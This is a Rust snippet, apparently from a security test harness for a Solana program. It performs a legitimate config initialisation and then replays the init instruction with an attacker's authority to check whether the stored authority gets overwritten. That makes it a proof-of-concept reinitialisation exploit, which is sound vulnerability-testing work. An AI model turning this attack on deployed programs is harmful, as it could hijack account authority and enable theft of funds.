let config_data = vec![0u8; 49];
let config = account(&program_id, &config_data, None);

let authority_legit_acc = wallet(1_000_000_000);
let authority_attacker_acc = wallet(1_000_000_000);

let ix_data = vec![0u8];

let metas = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_legit, false),
];
let ix = env.raw_ix(&ix_data, metas);

let contas = vec![
    (config_key, config.clone()),
    (authority_legit, authority_legit_acc.clone()),
];

let r = env.baseline("init legitimo", &ix, &contas);

let config_pos = after(&r, &config_key).clone();

let metas_attack = vec![
    AccountMeta::new(config_key, true),
    AccountMeta::new_readonly(authority_attacker, false),
];
let ix_attack = env.raw_ix(&ix_data, metas_attack);

let contas_attack = vec![
    (config_key, config_pos),
    (authority_attacker, authority_attacker_acc),
];

let ra = env.attack("reinit sobrescreve autoridade", &ix_attack, &contas_attack);

if ra.program_result == ProgramResult::Success {
    let data_after = after(&ra, &config_key).data();
    let auth_after = read_pubkey(data_after, 8);
    env.effect(
        "autoridade sobrescrita pelo atacante",
        auth_after == authority_attacker && auth_after != authority_legit,
    );
}

